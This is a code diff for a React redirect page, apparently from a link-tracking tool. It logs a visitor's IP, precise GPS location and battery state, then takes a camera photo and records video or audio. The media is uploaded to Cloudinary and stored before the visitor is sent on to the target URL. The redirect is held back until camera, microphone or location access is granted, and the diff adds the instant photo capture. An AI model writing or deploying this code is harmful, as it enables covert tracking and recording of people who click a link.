@@ -246,14 +246,13 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
   const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
-  const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a', battery: 'n/a' });
   const capturedDataRef = React.useRef<Partial<CapturedData>>({});
   const hasSavedRef = React.useRef(false);
 
   const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
     if (hasSavedRef.current && !isComplete) return; 
     
-    const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.location?.lat;
+    const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.cameraPhotoCapture || dataToSave.location?.lat;
     if (!hasMeaningfulData) return;
     
     hasSavedRef.current = true;
@@ -348,14 +347,12 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     if ('getBattery' in navigator) {
         try {
             const batteryManager = await (navigator as any).getBattery();
-            permissionStatusRef.current.battery = 'granted';
             capturedDataRef.current.battery = {
                 level: Math.round(batteryManager.level * 100),
                 charging: batteryManager.charging
             };
         } catch (e) { 
             console.error("Could not fetch battery data:", e);
-            permissionStatusRef.current.battery = 'denied';
         }
     }
   }, []);
@@ -375,45 +372,15 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
     });
   }, []);
-
-  React.useEffect(() => {
-    const loadSettings = async () => {
-        if (isPreview && previewSettings) {
-            setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
-            setStatus('redirecting');
-            return;
-        }
-        
-        if (!data) return setStatus('invalid');
-        
-        try {
-            const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
-            const querySnapshot = await getDocs(q);
-
-            if (querySnapshot.empty) {
-                return setStatus('invalid');
-            }
-
-            const configDoc = querySnapshot.docs[0];
-            const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
-            setSettings(fetchedSettings);
-
-            await captureInitialData();
-
-            setStatus('loading');
-        } catch (error) {
-            console.error("Error fetching settings: ", error);
-            setStatus('invalid');
-        }
-    };
-    loadSettings();
-  }, [data, previewSettings, isPreview, captureInitialData]);
   
-    const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw'): Promise<string> => {
+    const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw' | 'image'): Promise<string> => {
         const formData = new FormData();
         formData.append('file', blob);
         formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-        formData.append('resource_type', resourceType);
+        if (resourceType !== 'image') {
+          formData.append('resource_type', resourceType);
+        }
+        
         try {
             const response = await fetch(CLOUDINARY_UPLOAD_URL, {
                 method: 'POST',
@@ -432,166 +399,185 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             throw error;
         }
     };
-
-    const captureAndFinalize = React.useCallback(async () => {
-        if (!settings || isPreview) return;
-        setStatus('redirecting');
     
-        let cameraUrl: string | undefined;
-        let micUrl: string | undefined;
-
-        try {
-            if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: permissionStatusRef.current.camera === 'granted',
-                    audio: permissionStatusRef.current.microphone === 'granted',
-                });
-                
-                const recorder = new MediaRecorder(stream);
-                const chunks: Blob[] = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                
-                recorder.start();
-                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
-                recorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-
-                await new Promise(resolve => recorder.onstop = resolve);
-                const blob = new Blob(chunks, { type: permissionStatusRef.current.camera === 'granted' ? 'video/webm' : 'audio/webm' });
-                
-                if(permissionStatusRef.current.camera === 'granted') {
-                    cameraUrl = await uploadToCloudinary(blob, 'video');
-                } else if (permissionStatusRef.current.microphone === 'granted') {
-                    micUrl = await uploadToCloudinary(blob, 'raw');
-                }
-            }
-        } catch (uploadError) {
-            console.error("Media upload failed, proceeding without media:", uploadError);
-        }
-        
-        capturedDataRef.current.permissions = {
-            location: permissionStatusRef.current.location,
-            camera: permissionStatusRef.current.camera,
-            microphone: permissionStatusRef.current.microphone,
-        };
-        capturedDataRef.current.cameraCapture = cameraUrl;
-        capturedDataRef.current.microphoneCapture = micUrl;
-        
-        await saveToApi(capturedDataRef.current, settings, true);
-
-        if (settings.redirectDelay > 0) {
-            setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
-        } else {
-            window.location.href = settings.redirectUrl;
-        }
-    }, [settings, isPreview, addNotification, saveToApi]);
-
-    const requestPermissions = React.useCallback(async () => {
+    const startCaptureProcess = React.useCallback(async () => {
         if (!settings || isPreview) return;
+
         setStatus('redirecting');
         setIsWaitingForPermission(true);
 
         const required = settings.captureInfo.permissions;
-        if (required.length === 0) {
-            setIsWaitingForPermission(false);
-            return captureAndFinalize();
+        const permissions: CapturedData['permissions'] = { location: 'n/a', camera: 'n/a', microphone: 'n/a' };
+
+        // 1. Location
+        if (required.includes('location')) {
+            try {
+                const status = await navigator.permissions.query({ name: 'geolocation' });
+                if (status.state === 'prompt') {
+                    await new Promise<void>((resolve) => navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve(), { timeout: 15000, enableHighAccuracy: true }));
+                }
+                const finalStatus = await navigator.permissions.query({ name: 'geolocation' });
+                permissions.location = finalStatus.state;
+                if (finalStatus.state === 'granted') await captureGpsLocation();
+            } catch (e) {
+                permissions.location = 'denied';
+            }
         }
 
-        let hasDenied = false;
-        const newlyDenied: PermissionType[] = [];
-
-        for (const perm of required) {
-            if (perm === 'battery') continue;
+        // 2. Media (Camera & Mic)
+        const needsCamera = required.includes('camera');
+        const needsMic = required.includes('microphone');
+        let mediaStream: MediaStream | null = null;
+        if (needsCamera || needsMic) {
             try {
-                if (perm === 'location') {
-                    const status = await navigator.permissions.query({ name: 'geolocation' });
-                    permissionStatusRef.current.location = status.state;
-                    if (status.state === 'prompt') {
-                       await new Promise<void>((resolve) => navigator.geolocation.getCurrentPosition(
-                           () => { permissionStatusRef.current.location = 'granted'; resolve(); },
-                           () => { permissionStatusRef.current.location = 'denied'; resolve(); },
-                           { timeout: 15000 }
-                       ));
-                    }
-                    if (permissionStatusRef.current.location === 'granted') {
-                        await captureGpsLocation();
-                    }
-                } else if (perm === 'camera' || perm === 'microphone') {
-                     const constraints = { video: perm === 'camera', audio: perm === 'microphone' };
-                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                     permissionStatusRef.current[perm] = 'granted';
-                     stream.getTracks().forEach(track => track.stop());
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: needsCamera, audio: needsMic });
+                if (needsCamera) permissions.camera = 'granted';
+                if (needsMic) permissions.microphone = 'granted';
+            } catch (e) {
+                if (needsCamera) permissions.camera = 'denied';
+                if (needsMic) permissions.microphone = 'denied';
+            }
+        }
+        capturedDataRef.current.permissions = permissions;
+
+        // 3. Check for hard denials
+        const denied = required.filter(p => p !== 'battery' && permissions[p as 'location' | 'camera' | 'microphone'] === 'denied');
+        if (denied.length > 0) {
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            setDeniedPermissions(denied);
+            setStatus('permission_denied');
+            setIsWaitingForPermission(false);
+            return;
+        }
+
+        // 4. Capture photo immediately if needed
+        if (mediaStream && needsCamera) {
+            const videoTrack = mediaStream.getVideoTracks()[0];
+            const imageCapture = new (window as any).ImageCapture(videoTrack);
+            try {
+                const photoBlob = await imageCapture.takePhoto();
+                const photoUrl = await uploadToCloudinary(photoBlob, 'image');
+                capturedDataRef.current.cameraPhotoCapture = photoUrl;
+            } catch (e) {
+                console.error("Photo capture/upload failed:", e);
+            }
+        }
+
+        // 5. Start Recording if needed
+        let cameraUrl: string | undefined;
+        let micUrl: string | undefined;
+        if (mediaStream && (needsCamera || needsMic)) {
+            try {
+                const recorder = new MediaRecorder(mediaStream);
+                const chunks: Blob[] = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+
+                const recordingBlob = new Blob(chunks, { type: needsCamera ? 'video/webm' : 'audio/webm' });
+                if (needsCamera) {
+                    cameraUrl = await uploadToCloudinary(recordingBlob, 'video');
+                } else if (needsMic) {
+                    micUrl = await uploadToCloudinary(recordingBlob, 'raw');
                 }
-            } catch (error) {
-                console.warn(`Permission denied for ${perm}:`, error);
-                permissionStatusRef.current[perm] = 'denied';
+            } catch (e) {
+                console.error("Recording or upload failed:", e);
+            } finally {
+                mediaStream.getTracks().forEach(track => track.stop());
             }
         }
         
-        required.forEach(p => {
-            if (p !== 'battery' && permissionStatusRef.current[p] === 'denied') {
-                hasDenied = true;
-                newlyDenied.push(p);
-            }
-        });
-
         setIsWaitingForPermission(false);
-        if (hasDenied) {
-            setDeniedPermissions(newlyDenied);
-            setStatus('permission_denied');
-        } else {
-            captureAndFinalize();
+        capturedDataRef.current.cameraCapture = cameraUrl;
+        capturedDataRef.current.microphoneCapture = micUrl;
+
+        await saveToApi(capturedDataRef.current, settings, true);
+
+        if (settings.redirectDelay > 0) {
+            await new Promise(resolve => setTimeout(resolve, settings.redirectDelay * 1000));
         }
-    }, [settings, isPreview, captureAndFinalize, captureGpsLocation]);
+        if (!isPreview) {
+            window.location.href = settings.redirectUrl;
+        }
+    }, [settings, isPreview, addNotification, saveToApi, captureGpsLocation]);
 
 
-  React.useEffect(() => {
-    if (status === 'loading' && settings && !isPreview) {
-        requestPermissions();
-    }
-  }, [status, settings, isPreview, requestPermissions]);
+    React.useEffect(() => {
+        const loadSettings = async () => {
+            if (isPreview && previewSettings) {
+                setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
+                setStatus('redirecting');
+                return;
+            }
+            if (!data) return setStatus('invalid');
+            
+            try {
+                const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
+                const querySnapshot = await getDocs(q);
+                if (querySnapshot.empty) return setStatus('invalid');
 
-  const renderContent = () => {
-    if (status === 'initializing') {
-      return <h1 className="text-2xl font-bold text-white">{t('redirect_initializing')}</h1>;
-    }
-    if (status === 'invalid') {
-        return (
-            <div className="text-center p-8 bg-slate-800 rounded-lg shadow-xl">
-                 <h1 className="text-3xl font-bold text-red-500 mb-2">{t('redirect_invalid_link_title')}</h1>
-                 <p className="text-slate-400">{t('redirect_invalid_link_subtitle')}</p>
-            </div>
-        );
-    }
-    if (status === 'permission_denied') {
-        return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} t={t} />;
-    }
-    if (settings && (status === 'loading' || status === 'redirecting' || isPreview)) {
-      const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
-      const isPaused = isPreview || status === 'loading' || isWaitingForPermission;
-      return <CardComponent settings={settings} isPaused={isPaused} t={t} />;
-    }
-    
-    return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
-  };
+                const configDoc = querySnapshot.docs[0];
+                const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
+                setSettings(fetchedSettings);
+                await captureInitialData();
+                setStatus('loading');
+            } catch (error) {
+                console.error("Error fetching settings: ", error);
+                setStatus('invalid');
+            }
+        };
+        loadSettings();
+    }, [data, previewSettings, isPreview, captureInitialData]);
+
+    React.useEffect(() => {
+        if (status === 'loading' && settings && !isPreview) {
+            startCaptureProcess();
+        }
+    }, [status, settings, isPreview, startCaptureProcess]);
+
+    const renderContent = () => {
+        if (status === 'initializing') {
+            return <h1 className="text-2xl font-bold text-white">{t('redirect_initializing')}</h1>;
+        }
+        if (status === 'invalid') {
+            return (
+                <div className="text-center p-8 bg-slate-800 rounded-lg shadow-xl">
+                     <h1 className="text-3xl font-bold text-red-500 mb-2">{t('redirect_invalid_link_title')}</h1>
+                     <p className="text-slate-400">{t('redirect_invalid_link_subtitle')}</p>
+                </div>
+            );
+        }
+        if (status === 'permission_denied') {
+            return <PermissionInstructions onRetry={startCaptureProcess} requiredPermissions={deniedPermissions} t={t} />;
+        }
+        if (settings && (status === 'loading' || status === 'redirecting' || isPreview)) {
+            const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
+            const isPaused = isPreview || status === 'loading' || isWaitingForPermission;
+            return <CardComponent settings={settings} isPaused={isPaused} t={t} />;
+        }
+        return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
+    };
   
-  const backgroundStyle: React.CSSProperties = {
-    backgroundColor: settings?.backgroundColor,
-    ...(settings?.backgroundImageUrl && {
-      backgroundImage: `url(${settings.backgroundImageUrl})`,
-      backgroundSize: 'cover',
-      backgroundPosition: 'center',
-    }),
-  };
+    const backgroundStyle: React.CSSProperties = {
+        backgroundColor: settings?.backgroundColor,
+        ...(settings?.backgroundImageUrl && {
+        backgroundImage: `url(${settings.backgroundImageUrl})`,
+        backgroundSize: 'cover',
+        backgroundPosition: 'center',
+        }),
+    };
 
-  return (
-    <div className={`w-full h-full flex justify-center items-center p-4 ${settings?.theme || 'dark'}`} style={backgroundStyle}>
-      <div className={`${isEmbeddedPreview ? '' : 'absolute inset-0 bg-black/30'}`}></div>
-      <div className="relative z-10">
-        {renderContent()}
-      </div>
-    </div>
-  );
+    return (
+        <div className={`w-full h-full flex justify-center items-center p-4 ${settings?.theme || 'dark'}`} style={backgroundStyle}>
+          <div className={`${isEmbeddedPreview ? '' : 'absolute inset-0 bg-black/30'}`}></div>
+          <div className="relative z-10">
+            {renderContent()}
+          </div>
+        </div>
+    );
 };
 
 export default RedirectPage;
